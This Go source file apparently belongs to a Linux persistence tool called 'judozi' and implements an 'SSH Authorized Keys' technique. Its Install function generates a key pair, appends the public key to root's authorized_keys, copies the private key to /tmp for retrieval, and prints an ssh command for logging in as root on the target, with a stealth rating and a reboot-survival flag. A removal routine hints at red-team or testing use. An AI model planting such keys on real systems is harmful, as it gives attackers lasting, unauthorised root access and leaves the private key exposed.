//go:build linux

package techniques

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
)

type SSHKey struct {
	publicKey  string
	installedPath string
}

func NewSSHKey() Technique {
	return &SSHKey{}
}

func (s *SSHKey) Name() string {
	return "SSH Authorized Keys"
}

func (s *SSHKey) Description() string {
	return "Add SSH public key to root's authorized_keys"
}

func (s *SSHKey) StealthLevel() string {
	return "medium"
}

func (s *SSHKey) SurvivesReboot() bool {
	return true
}

func (s *SSHKey) Install() error {
	// Generate SSH key pair if not exists
	sshDir := "/root/.ssh"
	if err := os.MkdirAll(sshDir, 0700); err != nil {
		return fmt.Errorf("create .ssh directory: %w", err)
	}
	
	keyPath := filepath.Join(sshDir, "judozi_key")
	
	// Generate new SSH key
	cmd := exec.Command("ssh-keygen", "-t", "ed25519", "-f", keyPath, "-N", "", "-C", "judozi-persistence")
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("generate SSH key: %w", err)
	}
	
	// Read public key
	pubKeyData, err := os.ReadFile(keyPath + ".pub")
	if err != nil {
		return fmt.Errorf("read public key: %w", err)
	}
	s.publicKey = string(pubKeyData)
	
	// Append to authorized_keys
	authKeysPath := filepath.Join(sshDir, "authorized_keys")
	f, err := os.OpenFile(authKeysPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
	if err != nil {
		return fmt.Errorf("open authorized_keys: %w", err)
	}
	defer f.Close()
	
	if _, err := f.WriteString("\n" + s.publicKey); err != nil {
		return fmt.Errorf("write to authorized_keys: %w", err)
	}
	
	s.installedPath = authKeysPath
	
	// Save private key to /tmp for retrieval
	privKeyDest := "/tmp/judozi_private_key"
	if err := exec.Command("cp", keyPath, privKeyDest).Run(); err == nil {
		os.Chmod(privKeyDest, 0600)
	}
	
	return nil
}

func (s *SSHKey) Remove() error {
	authKeysPath := "/root/.ssh/authorized_keys"
	
	// Read current authorized_keys
	data, err := os.ReadFile(authKeysPath)
	if err != nil {
		return err
	}
	
	// Remove judozi key entries
	lines := []string{}
	for _, line := range splitLines(string(data)) {
		if !contains(line, "judozi-persistence") {
			lines = append(lines, line)
		}
	}
	
	return os.WriteFile(authKeysPath, []byte(joinLines(lines)), 0600)
}

func (s *SSHKey) Details() string {
	return fmt.Sprintf(`SSH key added to /root/.ssh/authorized_keys
Private key saved to: /tmp/judozi_private_key

To connect remotely:
  ssh -i /tmp/judozi_private_key root@<target_ip>
`)
}
